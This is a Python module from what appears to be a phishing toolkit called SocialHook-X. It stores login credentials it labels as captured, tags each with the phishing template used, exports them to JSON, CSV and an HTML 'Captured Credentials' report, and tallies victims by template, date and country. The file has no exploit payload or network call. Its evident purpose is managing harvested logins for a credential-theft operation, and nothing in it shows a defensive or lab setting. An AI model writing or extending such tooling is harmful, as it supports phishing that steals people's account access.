"""
SocialHook-X - Credential Storage Manager

Manages credential storage with multiple export formats.
"""

import json
import csv
import logging
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
from .utils.helpers import FileHelpers
from .utils.formatters import CredentialFormatter

logger = logging.getLogger(__name__)


class CredentialStorage:
    """Manages credential storage and export"""
    
    def __init__(self, base_path: str = "output/credentials"):
        """Initialize credential storage
        
        Args:
            base_path: Base directory for credentials
        """
        self.base_path = base_path
        self.formatter = CredentialFormatter()
        self.credentials: List[Dict[str, Any]] = []
        self._ensure_directory()
    
    def _ensure_directory(self) -> None:
        """Ensure output directory structure exists"""
        FileHelpers.ensure_directory(self.base_path)
        FileHelpers.ensure_directory(f"{self.base_path}/json")
        FileHelpers.ensure_directory(f"{self.base_path}/csv")
        FileHelpers.ensure_directory(f"{self.base_path}/html")
        FileHelpers.ensure_directory(f"{self.base_path}/raw")
    
    def save_credential(self, credential_data: Dict[str, Any], 
                       template: str = "unknown") -> bool:
        """Save single credential
        
        Args:
            credential_data: Credential dictionary
            template: Template used for capture
        
        Returns:
            True if successful, False otherwise
        """
        try:
            # Add metadata
            credential_data['timestamp'] = datetime.now().isoformat()
            credential_data['template'] = template
            
            self.credentials.append(credential_data)
            
            # Auto-save to JSON
            return self._save_json([credential_data], append=True)
        except Exception as e:
            logger.error(f"Error saving credential: {e}")
            return False
    
    def save_credentials_batch(self, credentials: List[Dict[str, Any]], 
                              template: str = "unknown") -> bool:
        """Save batch of credentials
        
        Args:
            credentials: List of credential dictionaries
            template: Template used for capture
        
        Returns:
            True if successful, False otherwise
        """
        try:
            for cred in credentials:
                cred['timestamp'] = datetime.now().isoformat()
                cred['template'] = template
            
            self.credentials.extend(credentials)
            return self._save_json(credentials, append=True)
        except Exception as e:
            logger.error(f"Error saving credentials batch: {e}")
            return False
    
    def _save_json(self, credentials: List[Dict], append: bool = False) -> bool:
        """Save credentials as JSON
        
        Args:
            credentials: Credentials to save
            append: Append to existing file
        
        Returns:
            True if successful
        """
        try:
            timestamp = datetime.now().strftime("%Y%m%d")
            filepath = f"{self.base_path}/json/credentials_{timestamp}.json"
            
            if append and Path(filepath).exists():
                with open(filepath, 'r') as f:
                    existing = json.load(f)
                existing.extend(credentials)
                data = existing
            else:
                data = credentials
            
            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)
            
            logger.info(f"Credentials saved to JSON: {filepath}")
            return True
        except Exception as e:
            logger.error(f"Error saving JSON: {e}")
            return False
    
    def export_to_csv(self, credentials: Optional[List[Dict]] = None) -> Optional[str]:
        """Export credentials to CSV
        
        Args:
            credentials: Credentials to export (uses all if None)
        
        Returns:
            File path or None
        """
        try:
            data = credentials or self.credentials
            if not data:
                logger.warning("No credentials to export")
                return None
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = f"{self.base_path}/csv/credentials_{timestamp}.csv"
            
            with open(filepath, 'w', newline='') as f:
                fieldnames = list(data[0].keys())
                writer = csv.DictWriter(f, fieldnames=fieldnames)
                writer.writeheader()
                writer.writerows(data)
            
            logger.info(f"Credentials exported to CSV: {filepath}")
            return filepath
        except Exception as e:
            logger.error(f"Error exporting CSV: {e}")
            return None
    
    def export_to_html(self, credentials: Optional[List[Dict]] = None) -> Optional[str]:
        """Export credentials to HTML table
        
        Args:
            credentials: Credentials to export (uses all if None)
        
        Returns:
            File path or None
        """
        try:
            data = credentials or self.credentials
            if not data:
                logger.warning("No credentials to export")
                return None
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = f"{self.base_path}/html/credentials_{timestamp}.html"
            
            html_table = self.formatter.format_for_html_table(data)
            
            html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>SocialHook-X Captured Credentials</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #00a0ff; }}
        table {{ border-collapse: collapse; width: 100%; margin-top: 20px; }}
        th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
        th {{ background-color: #00a0ff; color: white; }}
        tr:nth-child(even) {{ background-color: #f2f2f2; }}
        .summary {{ background-color: #f9f9f9; padding: 10px; margin: 20px 0; border-left: 4px solid #00a0ff; }}
    </style>
</head>
<body>
    <h1>SocialHook-X Captured Credentials</h1>
    <div class="summary">
        <strong>Total Credentials:</strong> {len(data)}<br>
        <strong>Export Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}<br>
        <strong>Status:</strong> Report Generated
    </div>
    {html_table}
</body>
</html>
"""
            
            with open(filepath, 'w') as f:
                f.write(html_content)
            
            logger.info(f"Credentials exported to HTML: {filepath}")
            return filepath
        except Exception as e:
            logger.error(f"Error exporting HTML: {e}")
            return None
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get credential statistics
        
        Returns:
            Statistics dictionary
        """
        if not self.credentials:
            return {
                "total": 0,
                "by_template": {},
                "by_date": {},
                "by_country": {},
                "most_recent": None
            }
        
        stats = {
            "total": len(self.credentials),
            "by_template": {},
            "by_date": {},
            "by_country": {},
            "most_recent": None
        }
        
        for cred in self.credentials:
            # Count by template
            template = cred.get('template', 'unknown')
            stats['by_template'][template] = stats['by_template'].get(template, 0) + 1
            
            # Count by date
            if 'timestamp' in cred:
                date = cred['timestamp'][:10]
                stats['by_date'][date] = stats['by_date'].get(date, 0) + 1
            
            # Count by country
            if 'country' in cred:
                country = cred.get('country', 'unknown')
                stats['by_country'][country] = stats['by_country'].get(country, 0) + 1
        
        # Get most recent
        if self.credentials:
            stats['most_recent'] = max(
                self.credentials,
                key=lambda x: x.get('timestamp', '')
            )
        
        return stats
    
    def get_all_credentials(self) -> List[Dict[str, Any]]:
        """Get all stored credentials
        
        Returns:
            List of credentials
        """
        return self.credentials.copy()
    
    def filter_credentials(self, template: Optional[str] = None,
                          start_date: Optional[str] = None,
                          end_date: Optional[str] = None) -> List[Dict[str, Any]]:
        """Filter credentials by criteria
        
        Args:
            template: Filter by template
            start_date: Filter by start date (YYYY-MM-DD)
            end_date: Filter by end date (YYYY-MM-DD)
        
        Returns:
            Filtered credentials
        """
        results = self.credentials.copy()
        
        if template:
            results = [c for c in results if c.get('template') == template]
        
        if start_date:
            results = [c for c in results if c.get('timestamp', '') >= start_date]
        
        if end_date:
            results = [c for c in results if c.get('timestamp', '') <= end_date]
        
        return results
    
    def clear_credentials(self) -> bool:
        """Clear all stored credentials
        
        Returns:
            True if successful
        """
        try:
            self.credentials = []
            logger.info("Credentials cleared")
            return True
        except Exception as e:
            logger.error(f"Error clearing credentials: {e}")
            return False
    
    def load_credentials_from_file(self, filepath: str) -> bool:
        """Load credentials from JSON file
        
        Args:
            filepath: Path to JSON file
        
        Returns:
            True if successful
        """
        try:
            with open(filepath, 'r') as f:
                data = json.load(f)
            
            if isinstance(data, list):
                self.credentials.extend(data)
            else:
                self.credentials.append(data)
            
            logger.info(f"Loaded credentials from {filepath}")
            return True
        except Exception as e:
            logger.error(f"Error loading credentials: {e}")
            return False


# Global instance
_storage_instance: Optional[CredentialStorage] = None


def get_credential_storage(base_path: str = "output/credentials") -> CredentialStorage:
    """Get or create credential storage instance
    
    Args:
        base_path: Base directory for credentials
    
    Returns:
        CredentialStorage instance
    """
    global _storage_instance
    if _storage_instance is None:
        _storage_instance = CredentialStorage(base_path)
    return _storage_instance
